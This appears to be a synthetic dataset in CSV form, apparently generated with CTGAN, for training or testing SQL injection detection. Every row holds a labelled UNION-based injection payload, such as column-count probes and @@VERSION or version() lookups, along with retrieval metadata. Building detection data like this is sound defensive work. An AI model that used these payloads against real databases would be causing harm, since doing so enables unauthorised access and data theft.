id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000406,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000076,4.486335172091356
CTGAN_000407,attack,union,"-6815  )   where 2498  =  2498 union all select 2498,2498,2498,2498,2498--",nearest_attack_euclidean,R000259,5.855238460610722
CTGAN_000408,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000086,10.330457726119942
CTGAN_000409,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000218,6.186843544100257
CTGAN_000410,attack,union,"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",nearest_attack_euclidean,R000119,7.404097765688064
CTGAN_000411,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,6.828492082628634
CTGAN_000412,attack,union," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000021,10.02287489936071
CTGAN_000413,attack,union," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",nearest_attack_euclidean,R000034,8.82419203143747
CTGAN_000414,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000201,5.971306965769574
CTGAN_000415,attack,union,"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",nearest_attack_euclidean,R000169,6.07356605984579
CTGAN_000416,attack,union,"1 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000276,7.875005374881623
CTGAN_000417,attack,union,"-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--",nearest_attack_euclidean,R000166,7.000536306778607
CTGAN_000418,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000218,6.027990997834289
CTGAN_000419,attack,union,"-1244  )   as qszw where 2332  =  2332 union all select 2332,2332,2332,2332#",nearest_attack_euclidean,R000074,4.406901107721488
CTGAN_000420,attack,union,"1""   )    )     )   union all select null,null,null,null--",nearest_attack_euclidean,R000177,5.803657789789309
CTGAN_000421,attack,union,"1""   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000198,7.132002943622537
CTGAN_000422,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000290,4.416557611799551
CTGAN_000423,attack,union,"1"" where 1452  =  1452 union all select null,null,null,null--",nearest_attack_euclidean,R000152,5.985645067403986
CTGAN_000424,attack,union,"1' union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000229,6.99892938098396
CTGAN_000425,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,5.562869301466114
CTGAN_000426,attack,union,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000114,3.4832232628708995
CTGAN_000427,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000115,4.942986658500595
CTGAN_000428,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,4.120480696471175
CTGAN_000429,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000168,4.636729855133745
CTGAN_000430,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000309,3.9447994246706517
CTGAN_000431,attack,union,"1%""  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000293,5.213026267710254
CTGAN_000432,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000271,6.843361582896666
CTGAN_000433,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,5.656100042912128
CTGAN_000434,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000168,5.528548570515435
CTGAN_000435,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000071,4.840463094647435
CTGAN_000436,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000030,6.39249171249502
CTGAN_000437,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000013,7.329208087398311
CTGAN_000438,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000077,4.049862034129087
CTGAN_000439,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000088,4.755393416402782
CTGAN_000440,attack,union,"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",nearest_attack_euclidean,R000284,5.381761894942697
CTGAN_000441,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000189,11.516387653249726
CTGAN_000442,attack,union,"-6527'   )    )    union all select 5053,5053,5053,5053--",nearest_attack_euclidean,R000199,6.365102401869293
CTGAN_000443,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,5.724715561721808
CTGAN_000444,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000102,6.156860566307596
CTGAN_000445,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000156,5.412892255475396
CTGAN_000446,attack,union,"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",nearest_attack_euclidean,R000132,8.510016720351302
CTGAN_000447,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000194,5.2210224521349815
CTGAN_000448,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,5.793465805605687
CTGAN_000449,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000290,5.700853257166689
CTGAN_000450,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000051,6.782282526899484
CTGAN_000451,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000146,3.6433648765397533
CTGAN_000452,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000173,6.903421866447313
CTGAN_000453,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000190,6.099251708013671
CTGAN_000454,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,7.033752670738419
CTGAN_000455,attack,union,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000061,4.454887778815876
CTGAN_000456,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000115,5.5091976330572905
CTGAN_000457,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000088,10.511762262039525
CTGAN_000458,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000242,6.830573232364436
CTGAN_000459,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000290,6.481245715491423
CTGAN_000460,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R000252,5.649820564826002
CTGAN_000461,attack,union,"1%'   )    )     )   union all select null,null,null,null--",nearest_attack_euclidean,R000150,5.596386106318723
CTGAN_000462,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000263,7.230274266529965
CTGAN_000463,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000115,5.58385254715407
CTGAN_000464,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000086,5.645675354843685
CTGAN_000465,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,5.23973636871013
CTGAN_000466,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000086,5.271186216957345
CTGAN_000467,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000076,4.9131999953055425
CTGAN_000468,attack,union,"-8699""  )   union all select 8645,8645,8645,8645,8645,8645--",nearest_attack_euclidean,R000268,4.451603638377212
CTGAN_000469,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000077,5.930479014188705
CTGAN_000470,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000030,7.064543457876032
CTGAN_000471,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000288,7.22593832424822
CTGAN_000472,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000105,6.203560682590307
CTGAN_000473,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000088,7.114979595431652
CTGAN_000474,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,5.5643255686843185
CTGAN_000475,attack,union,"-5702'   )    )     )   union all select 7806,7806,7806,7806,7806--",nearest_attack_euclidean,R000283,6.380774150448407
CTGAN_000476,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,8.30218384200141
CTGAN_000477,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000077,5.976453286114971
CTGAN_000478,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000068,4.267115732917349
CTGAN_000479,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000100,4.554214721827292
CTGAN_000480,attack,union,"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",nearest_attack_euclidean,R000132,4.750979703210652
CTGAN_000481,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,4.225788883386707
CTGAN_000482,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,5.648116343905526
CTGAN_000483,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000168,5.537634776593475
CTGAN_000484,attack,union,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000114,3.984246937750058
CTGAN_000485,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000105,4.959818017078994
CTGAN_000486,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000242,4.31319692206571
CTGAN_000487,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000241,6.117062988758198
CTGAN_000488,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,7.207485688396854
CTGAN_000489,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,7.7168425132748615
CTGAN_000490,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000013,7.255543209746153
CTGAN_000491,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000086,6.196487939513491
CTGAN_000492,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000064,5.5585121766857375
CTGAN_000493,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000220,12.78560266289565
CTGAN_000494,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,6.672918837166308
CTGAN_000495,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000173,5.46893832116629
CTGAN_000496,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000100,4.060192659161989
CTGAN_000497,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000290,7.148660429707068
CTGAN_000498,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,6.064099502544606
CTGAN_000499,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000017,8.528723716990822
CTGAN_000500,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000076,4.061523116089931
